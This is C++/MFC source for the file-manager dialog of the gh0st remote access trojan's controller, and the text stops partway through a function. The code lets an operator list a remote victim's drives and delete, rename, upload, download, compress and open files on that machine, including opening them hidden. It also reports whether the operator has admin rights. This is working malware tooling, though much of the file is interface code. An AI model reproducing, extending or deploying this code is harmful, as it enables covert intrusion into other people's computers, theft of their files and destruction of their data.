// FileManagerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "FileManagerDlg.h"
#include "FileTransferModeDlg.h"
#include "InputDlg.h"
#include <windows.h>
#include <Shlwapi.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

enum
{
	COMMAND_COMPRESS_FILE_PARAM,
};

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

typedef struct {
	LVITEM* plvi;
	CString sCol2;
} lvItem, *plvItem;

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg dialog

BOOL DRIVE_Sys = FALSE;
BOOL DRIVE_CAZ = FALSE;

__int64	Bf_nCounters = 0;// 备份计数器  由于比较用
LONG	Bf_dwOffsetHighs = 0;
LONG	Bf_dwOffsetLows = 0;

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CFileManagerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFileManagerDlg)
	//}}AFX_DATA_INIT
	
	// 初始化应该传输的数据包大小为0
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICOFILE));  //窗口图标
	// 保存远程驱动器列表
	m_bCanAdmin = *m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	m_strDesktopPath = m_pContext->m_DeCompressionBuffer.GetBuffer(2);
	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1 + 1 + m_strDesktopPath.GetLength() + 1),
		m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - 1 - m_strDesktopPath.GetLength() - 1);
	
	m_bUseAdmin = false;
	m_hFileSend = INVALID_HANDLE_VALUE;
	m_hFileRecv = INVALID_HANDLE_VALUE;
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;
	DRIVE_Sys = FALSE;
	DRIVE_CAZ = FALSE;
	
	m_bIsStop = false;
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFileManagerDlg)
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	//{{AFX_MSG_MAP(CFileManagerDlg)
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, OnBeginDragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, OnBeginDragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, OnDblclkListRemote)
	ON_COMMAND(IDT_REMOTE_PREV, OnRemotePrev)
	ON_COMMAND(IDT_REMOTE_HOME, OnRemoteHome)
	ON_COMMAND(IDM_LOCAL_LIST, OnLocalList)
	ON_COMMAND(IDM_LOCAL_REPORT, OnLocalReport)
	ON_COMMAND(IDM_LOCAL_BIGICON, OnLocalBigicon)
	ON_COMMAND(IDM_LOCAL_SMALLICON, OnLocalSmallicon)
	ON_COMMAND(IDM_REMOTE_BIGICON, OnRemoteBigicon)
	ON_COMMAND(IDM_REMOTE_LIST, OnRemoteList)
	ON_COMMAND(IDM_REMOTE_REPORT, OnRemoteReport)
	ON_COMMAND(IDM_REMOTE_SMALLICON, OnRemoteSmallicon)
	ON_COMMAND(IDT_REMOTE_VIEW, OnRemoteView)
	ON_COMMAND(IDT_REMOTE_DESKTOP, OnRemoteDesktop)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_PREV, OnUpdateRemotePrev)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_HOME, OnUpdateRemoteHome)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_STOP, OnUpdateRemoteStop)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_NEWFOLDER, OnUpdateRemoteNewfolder)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_DELETE, OnUpdateRemoteDelete)
	ON_UPDATE_COMMAND_UI(IDT_TRANSFER_S, OnUpdateRemoteSend)
	ON_UPDATE_COMMAND_UI(IDT_TRANSFER_R, OnUpdateRemoteRecv)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_GENX, OnUpdateRemoteRefresh)
	ON_UPDATE_COMMAND_UI(IDT_REMOTE_DESKTOP, OnUpdateRemoteDesktop)
	ON_COMMAND(IDT_REMOTE_DELETE, OnRemoteDelete)
	ON_COMMAND(IDT_REMOTE_STOP, OnRemoteStop)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, OnRemoteNewFolder)
	ON_COMMAND(IDT_TRANSFER_R, OnTransferRecv)
	ON_COMMAND(IDM_RENAME, OnRename)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, OnEndLabelEditListLocal)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, OnEndLabelEditListRemote)
	ON_COMMAND(IDM_DELETE, OnDelete)
	ON_COMMAND(IDM_NEWFOLDER, OnNewFolder)
	ON_COMMAND(IDT_REMOTE_GENX, OnRefresh)
	ON_COMMAND(IDM_USE_ADMIN, OnUseAdmin)
	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, OnRemoteOpenShow)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, OnRemoteOpenHide)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, OnRclickListRemote)
	ON_COMMAND(IDT_TRANSFER_S, OnTransferSend)
	ON_COMMAND(IDM_COMPRESS,OnCompress)
    ON_COMMAND(IDM_UNCOMPRESS,OnUncompress)
	ON_COMMAND(IDM_REFRESH, OnRefresh)
	ON_COMMAND(IDM_TRANSFER_S, OnTransferSend)
	ON_COMMAND(IDM_TRANSFER_R, OnTransferRecv)
	ON_CBN_SETFOCUS(IDC_REMOTE_PATH, OnSetfocusRemotePath)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CFileManagerDlg message handlers

int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
		(
		lpFileName,
		dwFileAttributes, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
		);

	return sfi.iIcon;
}

void CFileManagerDlg::SortColumn1(int iCol, bool bAsc)
{
	m_bAscending1 = bAsc;
	m_nSortedCol1 = iCol;
	
	// set sort image for header and sort column.
	CXTPSortClass csc1(&m_list_remote, m_nSortedCol1);
	csc1.Sort(m_bAscending1, xtpSortString);
}

void CFileManagerDlg::SortColumn2(int iCol, bool bAsc)
{
	m_bAscending2 = bAsc;
	m_nSortedCol2 = iCol;
	
	// set sort image for header and sort column.
//	CXTPSortClass csc2(&m_list_sev, m_nSortedCol2);;
//	csc2.Sort(m_bAscending2, xtpSortString);
}

void CFileManagerDlg::SortColumn3(int iCol, bool bAsc)
{
	m_bAscending3 = bAsc;
	m_nSortedCol3 = iCol;
	// set sort image for header and sort column.
//	CXTPSortClass csc3(&m_list_wtsm, m_nSortedCol3);
//	csc3.Sort(m_bAscending3, xtpSortString);
}

void CFileManagerDlg::SortColumn4(int iCol, bool bAsc)
{
	m_bAscending4 = bAsc;
	m_nSortedCol4 = iCol;
	// set sort image for header and sort column.
//	CXTPSortClass csc4(&m_list_online, m_nSortedCol4);
//	csc4.Sort(m_bAscending4, xtpSortString);
}

BOOL CFileManagerDlg::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA ||
		pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		switch (0)
		{
		case 0:
			SortColumn1(pHDNotify->iItem, !m_bAscending1);
			break;
		case 1:
			SortColumn2(pHDNotify->iItem, !m_bAscending2);
			break;
		case 2:
			SortColumn3(pHDNotify->iItem, !m_bAscending3);
			break;
		case 3:
			SortColumn4(pHDNotify->iItem, !m_bAscending4);
			break;
		}
	}
	return CDialog::OnNotify(wParam, lParam, pResult);
}

BOOL CFileManagerDlg::MyShell_GetImageLists()
{
	I_ImageList0.DeleteImageList();
	I_ImageList0.Create(32, 32, ILC_COLOR32|ILC_MASK,2,2);
	I_ImageList0.SetBkColor(::GetSysColor(COLOR_BTNFACE));
 	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_Flie_A));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_Flie_C));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_Flie_D));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_Flie_E));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_Flie_F));
	I_ImageList0.Add(AfxGetApp()->LoadIcon(IDI_Flie_G));
	
	I_ImageList1.DeleteImageList();
	I_ImageList1.Create(16, 16, ILC_COLOR32|ILC_MASK,2,2);
	I_ImageList1.SetBkColor(::GetSysColor(COLOR_BTNFACE));
 	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_Flie_A));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_Flie_C));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_Flie_D));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_Flie_E));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_Flie_F));
	I_ImageList1.Add(AfxGetApp()->LoadIcon(IDI_Flie_G));
	
	return TRUE;
}

BOOL CFileManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog

	RECT	rect;
	GetClientRect(&rect);

	if (!m_wndToolBar_Remote.CreateEx( this,TBSTYLE_FLAT |TBSTYLE_LIST, 
		WS_CHILD | WS_VISIBLE | CBRS_ALIGN_TOP | CBRS_GRIPPER | CBRS_TOOLTIPS,
		CRect(2,2,0,0)) ||	!m_wndToolBar_Remote.LoadToolBar(IDR_FileToolBar) )
	{
		TRACE0("failed to create toolbar\n");  
		return FALSE;
	}

    m_wndToolBar_Remote.LoadTrueColorToolBar(
        16,
        IDB_FILETB_HOT,
        IDB_FILETB_HOT,
        IDB_FILETB_DISABLE);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
    VERIFY(m_wndToolBar_Remote.SetButtonText(0,"向上"));
	VERIFY(m_wndToolBar_Remote.SetButtonText(1,"主页"));
    VERIFY(m_wndToolBar_Remote.SetButtonText(2,"取消"));
    VERIFY(m_wndToolBar_Remote.SetButtonText(3,"新建"));
	VERIFY(m_wndToolBar_Remote.SetButtonText(4,"删除"));
    VERIFY(m_wndToolBar_Remote.SetButtonText(5,"上传"));
    VERIFY(m_wndToolBar_Remote.SetButtonText(6,"下载"));
    VERIFY(m_wndToolBar_Remote.SetButtonText(7,"刷新"));
	VERIFY(m_wndToolBar_Remote.SetButtonText(8,"桌面"));
	VERIFY(m_wndToolBar_Remote.SetButtonText(9,"查看"));

	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	// 设置标题
	CString str;
	str.Format("\\\\%s - 文件管理",m_IPAddress);
	SetWindowText(str);

	// 创建带进度条的状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 110);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
    m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
    m_ProgressCtrl->SetPos(0);                 //设置进度条当前位置
	
	FixedRemoteDriveList();
	/////////////////////////////////////////////
	//// Set up initial variables
	m_bDragging = false;
	m_nDragIndex = -1;
	m_nDropIndex = -1;
	CoInitialize(NULL);
//	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);   //设置为详细列表
	SHAutoComplete(GetDlgItem(IDC_REMOTE_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	// 状态栏还没有创建
	if (m_wndStatusBar.m_hWnd == NULL)
		return;
	// 定位状态栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);
	
	GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, 55, cx, (cy)-75);
	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(50, 32, cx-55, (cy)-150);
}

void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
{
	if(pDragList == pDropList) //we are return
	{
		return;
	} //EO if(pDragList...

	pDropList->SetItemState(m_nDropIndex, 0, LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES| LVS_EX_GRIDLINES);

	if ((CWnd *)pDropList == &m_list_local)
	{
		OnRemoteCopy();
	}
	else if ((CWnd *)pDropList == &m_list_remote)
	{
		OnLocalCopy();
	}
	else
	{
		// 见鬼了
		return;
	}
	// 重置
	m_nDropIndex = -1;
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CFileManagerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CFileManagerDlg::OnBeginDragListLocal(NMHDR* pNMHDR, LRESULT* pResult)
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;

	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_local.GetSelectedCount() > 1) //more than 1 item in list is selected
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
   		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_local; //make note of which list we are dragging from
	m_pDropWnd = &m_list_local;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture();
	*pResult = 0;
}

void CFileManagerDlg::OnBeginDragListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here
	//// Save the index of the item being dragged in m_nDragIndex
	////  This will be used later for retrieving the info dragged
	m_nDragIndex = pNMListView->iItem;
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;	
	
	//We will call delete later (in LButtonUp) to clean this up
	
   	if(m_list_remote.GetSelectedCount() > 1) //more than 1 item in list is selected
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
   	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);
	
	ASSERT(m_hCursor); //make sure it was created
	//// Change the cursor to the drag image
	////	(still must perform DragMove() in OnMouseMove() to show it moving)
	
	//// Set dragging flag and others
	m_bDragging = TRUE;	//we are in a drag and drop operation
	m_nDropIndex = -1;	//we don't have a drop index yet
	m_pDragList = &m_list_remote; //make note of which list we are dragging from
	m_pDropWnd = &m_list_remote;	//at present the drag list is the drop list
	
	//// Capture all mouse messages
	SetCapture();
	*pResult = 0;
}

void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)
{
	// TODO: Add your message handler code here and/or call default
	//While the mouse is moving, this routine is called.
	//This routine will redraw the drag image at the present
	// mouse location to display the dragging.
	//Also, while over a CListCtrl, this routine will highlight
	// the item we are hovering over.

	//// If we are in a drag/drop procedure (m_bDragging is true)
	if (m_bDragging)
	{	
		//SetClassLong(m_list_local.m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DRAG));

		//// Move the drag image
		CPoint pt(point);	//get our current mouse coordinates
		ClientToScreen(&pt); //convert to screen coordinates
		
		//// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);

		ASSERT(pDropWnd); //make sure we have a window

		//// If we drag outside current window we need to adjust the highlights displayed
		if (pDropWnd != m_pDropWnd)
		{
			if (m_nDropIndex != -1) //If we drag over the CListCtrl header, turn off the hover highlight
			{
				TRACE("m_nDropIndex is -1\n");
				CListCtrl* pList = (CListCtrl*)m_pDropWnd;
				VERIFY (pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED));
				// redraw item
				VERIFY (pList->RedrawItems (m_nDropIndex, m_nDropIndex));
				pList->UpdateWindow ();
				m_nDropIndex = -1;
			}
		}
		
		// Save current window pointer as the CListCtrl we are dropping onto
		m_pDropWnd = pDropWnd;

		// Convert from screen coordinates to drop target client coordinates
		pDropWnd->ScreenToClient(&pt);
		
		//If we are hovering over a CListCtrl we need to adjust the highlights
		if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl)))
		{			
			//Note that we can drop here
			SetCursor(m_hCursor);

			if (m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)
				return;

			UINT uFlags;
			CListCtrl* pList = (CListCtrl*)pDropWnd;
			
			// Turn off hilight for previous drop target
			pList->SetItemState (m_nDropIndex, 0, LVIS_DROPHILITED);
			// Redraw previous item
			pList->RedrawItems (m_nDropIndex, m_nDropIndex);
			
			// Get the item that is below cursor
			m_nDropIndex = ((CListCtrl*)pDropWnd)->HitTest(pt, &uFlags);
			if (m_nDropIndex != -1)
			{
				// Highlight it
				pList->SetItemState(m_nDropIndex, LVIS_DROPHILITED, LVIS_DROPHILITED);
				// Redraw item
				pList->RedrawItems(m_nDropIndex, m_nDropIndex);
				pList->UpdateWindow();
			}
		}
		else
		{
			//If we are not hovering over a CListCtrl, change the cursor
			// to note that we cannot drop here
			SetCursor(LoadCursor(NULL, IDC_NO));
		}
	}	
	CDialog::OnMouseMove(nFlags, point);
}

void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
	// TODO: Add your message handler code here and/or call default
	//This routine is the end of the drag/drop operation.
	//When the button is released, we are to drop the item.
	//There are a few things we need to do to clean up and
	// finalize the drop:
	//	1) Release the mouse capture
	//	2) Set m_bDragging to false to signify we are not dragging
	//	3) Actually drop the item (we call a separate function to do that)
	
	//If we are in a drag and drop operation (otherwise we don't do anything)
	if (m_bDragging)
	{
		// Release mouse capture, so that other controls can get control/messages
		ReleaseCapture();
		
		// Note that we are NOT in a drag operation
		m_bDragging = FALSE;
		
		CPoint pt (point); //Get current mouse coordinates
		ClientToScreen (&pt); //Convert to screen coordinates
		// Get the CWnd pointer of the window that is under the mouse cursor
		CWnd* pDropWnd = WindowFromPoint (pt);
		ASSERT (pDropWnd); //make sure we have a window pointer
		// If window is CListCtrl, we perform the drop
		if (pDropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl)))
		{
			m_pDropList = (CListCtrl*)pDropWnd; //Set pointer to the list we are dropping on
			DropItemOnList(m_pDragList, m_pDropList); //Call routine to perform the actual drop
		}
	}	
	CDialog::OnLButtonUp(nFlags, point);
}

BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		if (pMsg->wParam == VK_ESCAPE)
				return true;
		if (pMsg->wParam == VK_RETURN)
		{
			/*if (pMsg->hwnd == m_list_local.m_hWnd || 
				pMsg->hwnd == ((CEdit*)m_Local_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd)
			{
				
			}
			else */if (pMsg->hwnd == m_list_remote.m_hWnd ||
				pMsg->hwnd == ((CEdit*)m_Remote_Directory_ComboBox.GetWindow(GW_CHILD))->m_hWnd)
			{
				GetRemoteFileList();
			}
			return TRUE;
		}
	}
	// 单击除了窗口标题栏以外的区域使窗口移动
	if (pMsg->message == WM_LBUTTONDOWN && pMsg->hwnd == m_hWnd)
	{
		pMsg->message = WM_NCLBUTTONDOWN;
		pMsg->wParam = HTCAPTION;
	}
	
	if(m_wndToolBar_Remote.IsWindowVisible())
	{
		CWnd* pWndParent = m_wndToolBar_Remote.GetParent();
		m_wndToolBar_Remote.OnUpdateCmdUI((CFrameWnd*)this,TRUE);
	}
	
	return CDialog::PreTranslateMessage(pMsg);
}

void CFileManagerDlg::OnTimer(UINT nIDEvent)
{
	// TODO: Add your message handler code here and/or call default
	m_ProgressCtrl->StepIt();
	CDialog::OnTimer(nIDEvent);
}

void CFileManagerDlg::FixedRemoteDriveList()
{
	// 加载系统统图标列表 设置驱动器图标列表
//	HIMAGELIST hImageListLarge = I_ImageList0;
// 	HIMAGELIST hImageListSmall = I_ImageList1;
//	Shell_GetImageLists(&hImageListLarge, &hImageListSmall);

	DRIVE_Sys = FALSE;
	MyShell_GetImageLists();
	ListView_SetImageList(m_list_remote.m_hWnd, I_ImageList0, LVSIL_NORMAL);  //大图标
	ListView_SetImageList(m_list_remote.m_hWnd, I_ImageList1, LVSIL_SMALL);   //列表图标

	m_list_remote.DeleteAllItems();
	// 重建Column
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名称",  LVCFMT_LEFT, 225);
	m_list_remote.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "总大小", LVCFMT_LEFT, 125);
	m_list_remote.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);

	char	*pDrive = NULL;
	pDrive = (char *)m_bRemoteDriveList;

	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间

	/*
	6	DRIVE_FLOPPY
	7	DRIVE_REMOVABLE
	8	DRIVE_FIXED
	9	DRIVE_REMOTE
	10	DRIVE_REMOTE_DISCONNECT
	11	DRIVE_CDROM
	*/
	int	nIconIndex = -1;
	//用一个循环遍历所有发送来的信息，先是到列表中
	for (int i = 0; pDrive[i] != '\0';)
	{
		//由驱动器名判断图标的索引
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 0;
		}
		else
		{
			switch (pDrive[i + 1])
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 3;
				break;
			case DRIVE_FIXED:
				if(!DRIVE_Sys)
				{
					DRIVE_Sys= TRUE;
					nIconIndex = 1;
				}
				else
				    nIconIndex = 2;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 4;
				break;
			case DRIVE_CDROM:
				nIconIndex = 5;
				break;
			default:
				nIconIndex = 2;
				break;		
			}
		}
		//显示驱动器名
		CString	str;
		str.Format("%c:\\", pDrive[i]);
		int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);
		m_list_remote.SetItemData(nItem, 1);
	    //显示驱动器大小
		memcpy(&AmntMB, pDrive + i + 2, 4);
		memcpy(&FreeMB, pDrive + i + 6, 4);
		str.Format("%12.1f GB", (float)AmntMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);
		
		i += 10;

		char	*lpFileSystemName = NULL;
		char	*lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		// 磁盘类型, 为空就显示磁盘名称
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_list_remote.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
		}


		i += lstrlen(pDrive + i) + 1;
	}
	// 重置远程当前路径
	m_Remote_Path = "";
	m_Remote_Directory_ComboBox.ResetContent();

	DRIVE_CAZ = FALSE;
	DWORD_PTR dwResult;
	ShowMessage("远程计算机：磁盘列表");
	SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 0, 0, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);
	SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, NULL, SMTO_ABORTIFHUNG|SMTO_BLOCK, 500, &dwResult);

	//返回OnInitDialog中查看FixedLocalDriveList
}

void CFileManagerDlg::OnClose()
{
	// TODO: Add your message handler code here and/or call default
	CoUninitialize();
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	DestroyWindow();
}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strCurPath = "";
		return strCurPath;
	}
	strCurPath = str.Left(Index);
	
	if(strCurPath.Right(1) != "\\")
		strCurPath += "\\";
	return strCurPath;
}

void CFileManagerDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FILE_LIST: // 文件列表
		FixedRemoteFileList(m_pContext->m_DeCompressionBuffer.GetBuffer(0),m_pContext->m_DeCompressionBuffer.GetBufferLen()-1);
		break;
	case TOKEN_FILE_SIZE: // 传输文件时的第一个数据包，文件大小，及文件名
		CreateLocalRecvFile();
		break;
	case TOKEN_FILE_DATA: // 文件内容
		WriteLocalRecvFile();
		break;
	case TOKEN_TRANSFER_FINISH: // 传输完成
		EndLocalRecvFile();
		break;
	case TOKEN_CREATEFOLDER_FINISH:
		GetRemoteFileList(".");
		break;
	case TOKEN_DELETE_FINISH:
		EndRemoteDeleteFile();
		break;
	case TOKEN_GET_TRANSFER_MODE: //文件上传
		SendTransferMode();
		break;
	case TOKEN_DATA_CONTINUE:
		SendFileData();    //文件上传数据
		break;
	case TOKEN_RENAME_FINISH:
		// 刷新远程文件列表
		GetRemoteFileList(".");
		break;
	case TOKEN_COMPRESS_FINISH:
		GetRemoteFileList(".");
		break;
	default:
		SendException();
		break;
	}
}

void CFileManagerDlg::GetRemoteFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_remote.GetSelectionMark();

		// 如果有选中的，是目录
		if (nItem != -1)
		{
			if (m_list_remote.GetItemData(nItem) == 1)
			{
				directory = m_list_remote.GetItemText(nItem, 0);
			}
		}
		// 从组合框里得到路径
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
		}
	}
	// 得到父目录
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{
		m_Remote_Path += directory;
		if(m_Remote_Path.GetLength() > 0 && m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}
	
	// 是驱动器的根目录,返回磁盘列表
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();
// 		CRect rectt;
// 		GetClientRect(&rectt);
// 		
// 		if(rectt.Width() > 0)
// 		{
// 			m_list_remote.SetColumnWidth(3,rectt.Width() - (400+5));
// 		}
		return;
	}

	// 发送数据前清空缓冲区
	int	PacketSize = m_Remote_Path.GetLength() + 2;
